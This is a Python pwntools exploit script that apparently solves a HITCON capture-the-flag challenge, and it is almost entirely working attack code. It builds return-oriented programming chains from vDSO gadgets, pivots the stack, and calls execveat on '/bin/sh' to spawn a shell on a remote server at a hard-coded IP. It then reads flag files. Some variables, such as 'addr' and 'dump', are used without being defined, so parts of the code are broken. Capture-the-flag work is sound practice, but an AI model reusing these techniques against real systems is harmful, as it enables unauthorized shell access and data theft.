#!/home/gym/.venvs/ctf/bin/python2
import os
import sys
from pwn import *
c = None
m = None

def decompile_binary():
    with open('text.dump', 'r') as td:
        code = td.read()
    with open('disass.txt', 'w') as dis:
        for i in range(len(code)):
            dis.write("\n#### DISASS BYTE %d ######\n"%i)
            dis.write(disasm(code[i:]))

def leak_VDSO():
    payload = p64(vdso+0x1000)+p64(0x4000f0)*20
    c.send(payload)
    dump += c.recv(0x1000)
    print len(dump)
    with open('/ctf/vdsodump2.bin', 'w') as out:
        out.write(dump)

def write4(where, what):
    vdso =0x5fe000
    pop_eax = vdso+0x8bd
    rsi_syscall=0x400111
    write_esi =vdso+0xf54
    rop = p64(pop_eax)
    rop += p64(2)
    # set rsi and call open (which will fail)
    rop += p64(rsi_syscall)
    rop += p64(where)
    # set eax
    rop += p64(pop_eax)
    rop += p64(what)
    rop += p64(write_esi)
    rop += "A"*8
    return rop

def main():
    # hitcon{u1tima43_m1racle_mem0r7}
    vdso =0x5fe000
    # pop r10 r12 r13 r14 rbp lea rsp, [r10-8]
    pop_regs = vdso+0xe2f
    # pop rdx r12 r13 r14 rbp lea rsp, [r10-8]
    pop_regs2 = vdso+0xe30
    # pop ebp ret
    pop_ebp = vdso+0x98c
    # pop eax ret
    pop_eax = vdso+0x8bd
    # mov [esi] eax, eax 0, pop ebp, ret
    write_esi = vdso+0xf54
    # pop rsi syscall ret
    rsi_syscall = 0x400111
    start = 0x4000f0

    new_stack = 0x610000
    # ret address after stack lift
    rop = write4(new_stack, start)
    # pivot stack
    rop += p64(pop_regs)
    # stack +8
    rop += p64(0x610008)
    # Junk registers
    rop += "B"*8*4

    # Execve_at
    # rdi - junk
    # rsi - ptr
    # rdx - argv
    # r10 - envp
    # r11 - flags

    payload = p64(0x400000)+rop
    c.send(payload)
    dump = c.recv(0x1000)


    # the addr of "/bin/sh\0"
    binsh=0x610088
    # we need to move up the stack
    rop2 = p64(pop_ebp)
    # This is where RDX and R10 will point (must be null)
    rop2 += p64(0)
    # move up the stack,
    # this gadget will be overwritten with the address of the
    # pop rsi syscall gadget
    rop2 += p64(pop_ebp)
    # The future RSI value (binsh addr)
    rop2 += p64(binsh)
    # overwrite the previous pop_ebp, with rsi_syscall
    rop2 += write4(0x610010,rsi_syscall)
    # set eax to the execve_at syscall number
    rop2 += p64(pop_eax)
    rop2 += p64(322)
    # Call the set rdx + stack lift gadget
    # the stack will be moved back to r10 (0x610000)
    # the next indtruction will be the first pop_ebp
    # then the pop rsi+syscall
    rop2 += p64(pop_regs2)
    # new RDX points to the same null value as R10
    rop2 += p64(0x610008)
    # junk
    rop2 += '\x00'*8

    payload = p64(addr)+rop2 +'/bin/sh\0'
    c.send(payload + 'A'*(0x10000 - len(payload)))
    dump = c.recv(0x1000)

    c.sendline('cat /home/*/flag*')

    c.interactive()

gdbs=[
    'b *0x4000f0'
        ]
bp =[

        ]
if __name__ == "__main__":
    context.terminal = ["tmux", "split-w", "-h"]
    #c = process("./bigLITTLE", aslr=True)
    #gdb.attach(c, "b 0x4000f0")
    c = remote("54.178.214.211", 3573)

    main()
